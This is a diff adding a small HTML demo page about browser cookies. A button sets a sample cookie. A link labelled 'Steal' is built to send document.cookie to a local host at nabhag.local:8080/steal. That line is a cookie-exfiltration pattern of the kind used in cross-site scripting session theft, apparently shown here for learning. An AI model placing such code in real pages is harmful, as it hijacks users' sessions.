@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <button id="setCookie">Create Cookie</button>
+    <a id="aSteal">Steal</a>
+    <a href="http://example.com">go to example.com</a>
+    <a href="http://www.example.com">go to www.example.com</a>
+
+    <script>
+      const butCreate = document.getElementById("setCookie");
+      butCreate.addEventListener(
+        "click",
+        (e) => (document.cookie = "Twitter=FTW")
+      );
+
+      const steal = document.getElementById("aSteal");
+      steal.href = `http://nabhag.local:8080/steal?v=${document.cookie}`;
+    </script>
+  </body>
+</html>
